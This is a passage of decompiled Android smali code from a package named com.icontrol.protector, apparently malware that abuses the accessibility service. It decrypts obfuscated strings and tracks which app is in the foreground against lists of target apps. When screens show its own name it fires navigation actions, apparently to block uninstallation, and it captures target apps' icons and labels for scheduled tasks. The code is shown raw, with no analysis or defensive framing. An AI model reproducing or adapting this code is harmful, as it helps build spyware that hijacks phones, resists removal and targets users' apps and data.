    const/4 v5, 0x1

    new-array v12, v5, [B

    const/16 v5, 0x59

    aput-byte v5, v12, v18

    new-array v5, v9, [B

    fill-array-data v5, :array_8f

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_22

    sget-boolean v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->h0:Z

    if-nez v3, :cond_22

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lcom/icontrol/protector/n;->i(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_22

    if-eqz v13, :cond_22

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v13}, Lcom/icontrol/protector/a;->N(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_22

    const/4 v3, 0x4

    new-array v3, v3, [B

    fill-array-data v3, :array_90

    new-array v5, v9, [B

    fill-array-data v5, :array_91

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    if-eqz v5, :cond_1c

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    :cond_1c
    const/16 v5, 0x14

    new-array v12, v5, [B

    fill-array-data v12, :array_92

    new-array v5, v9, [B

    fill-array-data v5, :array_93

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1e

    const/16 v5, 0x2a

    new-array v5, v5, [B

    fill-array-data v5, :array_94

    new-array v12, v9, [B

    fill-array-data v12, :array_95

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_1d

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-static {v12}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v25

    if-eqz v25, :cond_1d

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1d

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_1d
    const/16 v5, 0x2f

    new-array v5, v5, [B

    fill-array-data v5, :array_96

    new-array v12, v9, [B

    fill-array-data v12, :array_97

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_1e

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-static {v12}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v25

    if-eqz v25, :cond_1e

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1e

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_1e
    const/16 v5, 0x14

    new-array v5, v5, [B

    fill-array-data v5, :array_98

    new-array v12, v9, [B

    fill-array-data v12, :array_99

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_20

    const/16 v5, 0x3a

    new-array v5, v5, [B

    fill-array-data v5, :array_9a

    new-array v12, v9, [B

    fill-array-data v12, :array_9b

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_1f

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-static {v12}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v22

    if-eqz v22, :cond_1f

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1f

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_1f
    const/16 v5, 0x24

    new-array v5, v5, [B

    fill-array-data v5, :array_9c

    new-array v12, v9, [B

    fill-array-data v12, :array_9d

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_20

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result v5

    if-eqz v5, :cond_20

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_20
    const/16 v5, 0x19

    new-array v5, v5, [B

    fill-array-data v5, :array_9e

    new-array v12, v9, [B

    fill-array-data v12, :array_9f

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_21

    const/16 v5, 0x3d

    new-array v5, v5, [B

    fill-array-data v5, :array_a0

    new-array v12, v9, [B

    fill-array-data v12, :array_a1

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_21

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-static {v12}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v22

    if-eqz v22, :cond_21

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_21

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    return-void

    :cond_21
    invoke-direct {v7, v4, v13, v3}, Lcom/icontrol/protector/AccessServices;->c(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_b

    goto :goto_10

    :goto_f
    :try_start_e
    invoke-virtual {v3}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_22
    :goto_10
    invoke-static {}, Lcom/icontrol/protector/AccessServices;->q()Z

    move-result v3

    if-nez v3, :cond_23

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v7, v3}, Lcom/icontrol/protector/AccessServices;->d(Landroid/content/Context;)V

    goto :goto_11

    :catch_c
    move-exception v0

    move-object v1, v0

    const/16 v2, 0xb

    goto/16 :goto_2b

    :cond_23
    :goto_11
    if-eqz v13, :cond_25

    const-string v3, " "

    invoke-virtual {v13, v3, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_25

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_c

    :try_start_f
    invoke-static {v13, v1}, Lcom/icontrol/protector/n;->P(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v3

    if-eqz v3, :cond_24

    const/16 v3, 0x80

    invoke-virtual {v1, v13, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    goto :goto_12

    :catch_d
    move-exception v0

    move-object v1, v0

    goto :goto_13

    :cond_24
    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_a2

    new-array v1, v9, [B

    fill-array-data v1, :array_a3

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v3, 0x17

    new-array v3, v3, [B

    fill-array-data v3, :array_a4

    new-array v4, v9, [B

    fill-array-data v4, :array_a5

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_a6

    new-array v1, v9, [B

    fill-array-data v1, :array_a7

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_d

    :cond_25
    :goto_12
    move-object v12, v1

    goto :goto_14

    :goto_13
    :try_start_10
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    return-void

    :goto_14
    sget-object v1, Lcom/icontrol/protector/My_Configs;->Click_Prim:Ljava/lang/String;

    const/4 v3, 0x1

    new-array v4, v3, [B

    const/16 v3, 0x45

    aput-byte v3, v4, v18

    new-array v3, v9, [B

    fill-array-data v3, :array_a8

    invoke-static {v4, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_26

    sget-boolean v1, Lcom/icontrol/protector/AccessServices;->y:Z

    if-eqz v1, :cond_26

    if-nez v2, :cond_27

    :cond_26
    sget-boolean v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->h0:Z

    if-nez v1, :cond_27

    sget-boolean v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->i0:Z

    if-nez v1, :cond_27

    sget-boolean v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->j0:Z

    if-nez v1, :cond_27

    sget-object v1, Lcom/icontrol/protector/AccessServices;->F:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_27

    sget-object v1, Lcom/icontrol/protector/AccessServices;->G:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_27

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->G:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_27

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->D:Ljava/lang/String;

    invoke-static {v1, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_27

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->H:Ljava/lang/String;

    invoke-static {v1, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2a

    :cond_27
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->D:Ljava/lang/String;

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v3, v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_29

    const/16 v3, 0x22

    if-lt v1, v3, :cond_29

    if-nez v2, :cond_28

    iget v1, v7, Lcom/icontrol/protector/AccessServices;->g:I

    iget v2, v7, Lcom/icontrol/protector/AccessServices;->h:I

    invoke-static {v1, v2}, Lcom/icontrol/protector/a;->h(II)V

    :cond_28
    return-void

    :cond_29
    invoke-static {v2, v14}, Lcom/icontrol/protector/a;->l(Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_2a
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/16 v5, 0xe

    new-array v2, v5, [B

    fill-array-data v2, :array_a9

    new-array v3, v9, [B

    fill-array-data v3, :array_aa

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_2b

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    new-array v2, v15, [B

    fill-array-data v2, :array_ab

    new-array v4, v9, [B

    fill-array-data v4, :array_ac

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2c

    :cond_2b
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v2

    invoke-virtual {v7, v1, v12, v2}, Lcom/icontrol/protector/AccessServices;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)V

    :cond_2c
    const/16 v4, 0x12

    if-eqz v13, :cond_2d

    sget-object v1, Lcom/icontrol/protector/a;->b:Ljava/util/ArrayList;

    invoke-virtual {v1, v13}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v1
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_c

    if-eqz v1, :cond_2d

    :try_start_11
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1, v13}, Lcom/icontrol/protector/n;->z(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v3, 0x1

    new-array v5, v3, [B

    const/16 v17, -0x38

    aput-byte v17, v5, v18

    new-array v3, v9, [B

    fill-array-data v3, :array_ad

    invoke-static {v5, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v3, 0x22

    new-array v3, v3, [B

    fill-array-data v3, :array_ae

    new-array v5, v9, [B

    fill-array-data v5, :array_af

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/icontrol/protector/b$b;->j:Lcom/icontrol/protector/b$b;

    invoke-static {v1, v2}, Lcom/icontrol/protector/b;->c(Ljava/lang/String;Lcom/icontrol/protector/b$b;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_e

    goto :goto_15

    :catch_e
    move-exception v0

    move-object v1, v0

    :try_start_12
    new-array v2, v4, [B

    fill-array-data v2, :array_b0

    new-array v3, v9, [B

    fill-array-data v3, :array_b1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_2d
    :goto_15
    const/16 v5, 0x90

    if-eqz v13, :cond_30

    sget-object v1, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v1, v13}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_31

    const/16 v3, 0xd

    new-array v1, v3, [B

    fill-array-data v1, :array_b2

    new-array v2, v9, [B

    fill-array-data v2, :array_b3

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    sget-object v1, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    invoke-virtual {v13, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_30

    sget-object v1, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;

    invoke-virtual {v1, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_30

    sput-object v13, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    sput-object v8, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;

    new-instance v1, Ljava/io/File;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-array v4, v11, [B

    fill-array-data v4, :array_b4

    new-array v6, v9, [B

    fill-array-data v6, :array_b5

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v4, 0xb

    new-array v6, v4, [B

    fill-array-data v6, :array_b6

    new-array v4, v9, [B

    fill-array-data v4, :array_b7

    invoke-static {v6, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v1, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v1
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_c

    if-eqz v1, :cond_2e

    :try_start_13
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1, v13}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1
    :try_end_13
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_13 .. :try_end_13} :catch_f
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_c

    goto :goto_16

    :catch_f
    move-exception v0

    move-object v1, v0

    :try_start_14
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 v1, 0x0

    :goto_16
    invoke-static {v1, v5, v5}, Lcom/icontrol/protector/n;->t(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;

    move-result-object v6

    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v2, 0x64

    invoke-virtual {v6, v1, v2, v4}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v22

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v7, v13}, Lcom/icontrol/protector/n;->z(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v25

    new-instance v2, Ljava/util/Timer;

    invoke-direct {v2}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lcom/icontrol/protector/AccessServices$b;

    move-object/from16 v27, v1

    move-object/from16 v1, v27

    move-object v11, v2

    move-object/from16 v2, p0

    const/16 v24, 0x1

    move-object/from16 v17, v4

    const/16 v15, 0x12

    move-object v4, v13

    const/16 v23, 0xe

    move-object/from16 v5, v25

    move-object/from16 v19, v6

    move-object/from16 v6, v22

    invoke-direct/range {v1 .. v6}, Lcom/icontrol/protector/AccessServices$b;-><init>(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[B)V

    const-wide/16 v1, 0x4b0

    move-object/from16 v3, v27

    invoke-virtual {v11, v3, v1, v2}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    invoke-virtual/range {v19 .. v19}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual/range {v17 .. v17}, Ljava/io/ByteArrayOutputStream;->close()V

    goto :goto_17

    :cond_2e
    const/16 v15, 0x12

    :cond_2f
    :goto_17
    const/4 v11, 0x0

    goto :goto_18

    :cond_30
    move v15, v4

    goto :goto_17

    :cond_31
    move v15, v4

    sget-object v1, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    if-eqz v1, :cond_2f

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1, v13}, Lcom/icontrol/protector/a;->N(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2f

    const/4 v11, 0x0

    sput-object v11, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    sput-object v8, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;

    :goto_18
    new-array v1, v9, [B

    fill-array-data v1, :array_b8

    new-array v2, v9, [B

    fill-array-data v2, :array_b9

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

